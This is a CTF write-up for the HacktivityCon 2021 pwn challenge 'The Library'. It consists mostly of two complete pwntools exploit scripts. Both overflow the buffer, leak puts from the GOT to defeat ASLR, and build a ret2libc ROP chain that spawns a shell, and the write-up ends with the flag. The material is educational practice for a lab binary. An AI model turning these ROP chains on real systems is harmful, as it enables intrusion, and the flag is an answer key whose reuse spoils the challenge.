---
name: The Library (2021)
event: HacktivityCon CTF 2021
category: Pwn
description: Writeup for The Library (pwn) - HacktivityCon CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# The Library

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/niPj8jYahV0/0.jpg)](https://youtu.be/niPj8jYahV0?t=1706s "HacktivityCon 2021: The Library")

## Challenge Description

> Welcome to The Library. I'm thinking of a book can you guess it?

## Solution

#### manual.py

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './the_library'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc = ELF('libc-2.3.1.so')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# POP RDI and ret(stack alignment) from ropper
pop_rdi = 0x401493
ret = 0x40101a

# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,
        elf.got.puts,
        elf.plt.puts,
        elf.symbols.main
    ]
})

# Send the payload
io.sendlineafter(b'>', payload)

io.recvline()  # Receive the newline

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# System(/bin/sh)
info("system_addr: %#x", libc.symbols.system)
bin_sh = next(libc.search(b'/bin/sh\x00'))
info("bin_sh: %#x", bin_sh)

# Payload to get shell
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        ret,
        libc.symbols.system
    ]
})

# Send the payload
io.sendline(payload)

# Got Shell?
io.interactive()
```
{% endcode %}

#### ropstar.py

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './the_library'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc = ELF('libc-2.3.1.so')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# Create a ROP object to handle complexities
rop = ROP(elf)

# Payload to leak libc function
rop.puts(elf.got.puts)
rop.main()

# Send the payload
io.sendlineafter(b'>', flat({offset: rop.chain()}))

io.recvline()  # Receive the newline

# Retrieve got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Reset ROP object with libc binary
rop = ROP(libc)

# Call ROP system, passing location of "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))

pprint(rop.dump())

# Send the payload
io.sendline(flat({offset: rop.chain()}))

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `flag{54b7742240a85bf62aa6fcf16c7e66a4}`
